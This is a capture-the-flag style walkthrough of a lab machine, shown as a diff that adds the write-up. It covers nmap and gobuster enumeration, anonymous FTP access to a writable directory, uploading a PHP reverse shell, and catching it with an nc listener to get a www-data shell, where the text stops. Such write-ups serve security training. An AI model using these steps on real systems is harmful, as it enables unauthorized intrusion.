@@ -1,0 +1,138 @@
+Title: Spice Hut
+
+We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!
+
+
+Running nmap -p- -sC -sV $IP --open, we get 3 services exposed:
+
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.4.23.126
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Maintenance
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+The FTP service allows anonymous access and hosts several files
+
+ftp $IP
+ftp> ls -la
+229 Entering Extended Passive Mode (|||59309|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
+drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
+-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
+-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+
+We can download the files and see if there is anything interesting inside of them.
+
+ftp> get .test.log -
+remote: .test.log
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .test.log (5 bytes).
+test
+226 Transfer complete.
+5 bytes received in 0.00 secs (5.3422 kB/s)
+
+ftp> get important.jpg
+local: important.jpg remote: important.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for important.jpg (251631 bytes).
+226 Transfer complete.
+251631 bytes received in 0.19 secs (1.2955 MB/s)
+
+ftp> get notice.txt -
+remote: notice.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for notice.txt (208 bytes).
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+226 Transfer complete.
+208 bytes received in 0.00 secs (95.4535 kB/s)
+
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
+drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
+226 Directory send OK.
+ftp> 
+
+A username "Maya" is disclosed on the note. Also as we can see the ftp directory is world-writable!
+
+---------------------------------
+
+WEB
+
+An enumeration of the web directory using gobuster reveals a "/files" directory: 
+
+gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+Browsing this directory confirms that it contains the resources exposed by the FTP service. 
+
+As we noticed there is a writable directory via FTP, let’s upload a PHP reverse shell: 
+
+ftp $IP
+Connected to $IP
+220 (vsFTPd 3.0.3)
+Name (startup.thm:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> cd ftp
+250 Directory successfully changed.
+
+ftp> put rev.php 
+local: rev.php remote: rev.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5492 bytes sent in 0.00 secs (51.8572 MB/s)
+
+ftp> 221 Goodbye.
+
+Now, browsing the uploaded resource (http://$IP/files/ftp/rev.php) allows us to get a reverse shell: 
+
+nc -lvnp 444
+listening on [any] 4444 ...
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 08:24:50 up 24 min,  0 users,  load average: 0.00, 0.02, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@startup:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
